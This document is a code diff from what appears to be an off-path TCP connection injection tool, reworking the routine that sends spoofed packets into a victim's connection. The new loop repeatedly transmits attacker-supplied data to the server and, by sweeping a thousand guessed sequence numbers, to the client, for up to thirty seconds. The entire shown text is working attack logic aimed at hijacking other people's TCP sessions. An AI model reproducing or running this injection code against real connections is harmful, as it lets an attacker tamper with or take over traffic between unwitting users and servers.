@@ -1687,60 +1687,75 @@ int infer_ack_number(void)
 
 
 /*
+ * if needed, inject data into the connection
+ *
  * inject data into a connection by trying various offsets of the guessed
  * seq/ack numbers
  */
-int inject_data(volatile conn_t *pconn, char *buf, off_t len)
-{
-	int i, j;
-	uint32_t ack = pconn->ack;
-	uint32_t seq = pconn->seq;
-
-	for (i = -99; i < 100; i++) {
-		for (j = -99; j < 100; j++) {
-			pconn->seq = seq + i;
-			pconn->ack = ack + j;
-			if (!tcp_send(g_ctx.pch, pconn, TH_ACK, buf, len))
-				return 0;
-			usleep(g_ctx.packet_delay);
-		}
-	}
-
-	pconn->seq = seq;
-	pconn->ack = ack;
-	return 1;
-}
-
-
-/*
- * if needed, inject data into the connection
- */
 int inject_the_data(void)
 {
-	if (g_ctx.inject_server) {
-		printf("[*] Injecting %lu bytes into the server!\n",
-				g_ctx.inject_server_len);
+	struct timeval inject_start, round_start, now, diff;
+	volatile conn_t *spoof = &(g_ctx.spoof);
+	conn_t reversed;
 
-		if (!inject_data(&(g_ctx.spoof), g_ctx.inject_server,
-					g_ctx.inject_server_len))
-			return 0;
-	}
+	/* feign success if we have nothing to inject */
+	if (!g_ctx.inject_server && !g_ctx.inject_client)
+		return 1;
 
 	if (g_ctx.inject_client) {
-		conn_t reversed;
-
 		/* swap the src/dst and seq/ack to send to the client */
-		reversed.src = g_ctx.spoof.dst;
-		reversed.dst = g_ctx.spoof.src;
-		reversed.seq = g_ctx.spoof.ack;
-		reversed.ack = g_ctx.spoof.seq;
+		reversed.src = spoof->dst;
+		reversed.dst = spoof->src;
+		reversed.seq = spoof->ack;
+		reversed.ack = spoof->seq;
+	}
+	/* the seq/ack are maintained separately for client and server */
 
-		printf("[*] Injecting %lu bytes into the client!\n",
-				g_ctx.inject_client_len);
+	gettimeofday(&inject_start, NULL);
 
-		if (!inject_data(&reversed, g_ctx.inject_client,
-					g_ctx.inject_client_len))
-			return 0;
+	while (1) {
+		char *buf;
+		off_t len;
+
+		gettimeofday(&round_start, NULL);
+
+		if (g_ctx.inject_server) {
+			buf = g_ctx.inject_server;
+			len = g_ctx.inject_server_len;
+
+			printf("[*] Injecting %lu bytes into the server!\n", len);
+
+			if (!tcp_send(g_ctx.pch, spoof, TH_PUSH|TH_ACK, buf, len))
+				return 0;
+			usleep(g_ctx.packet_delay);
+
+			spoof->seq += len;
+		}
+
+		if (g_ctx.inject_client) {
+			int i;
+			uint32_t seq_tmp;
+			buf = g_ctx.inject_client;
+			len = g_ctx.inject_client_len;
+
+			printf("[*] Injecting %lu bytes into the client!\n", len);
+
+			seq_tmp = reversed.seq;
+			for (i = 0; i < 1000; i++) {
+				reversed.seq = seq_tmp + i;
+				if (!tcp_send(g_ctx.pch, &reversed, TH_PUSH|TH_ACK, buf, len))
+					return 0;
+				usleep(g_ctx.packet_delay);
+			}
+			reversed.seq = seq_tmp + len;
+		}
+
+		gettimeofday(&now, NULL);
+		timersub(&now, &inject_start, &diff);
+		if (diff.tv_sec > 30)
+			break;
+
+		wait_until("data-inject", &round_start, 2, 0);
 	}
 	return 1;
 }
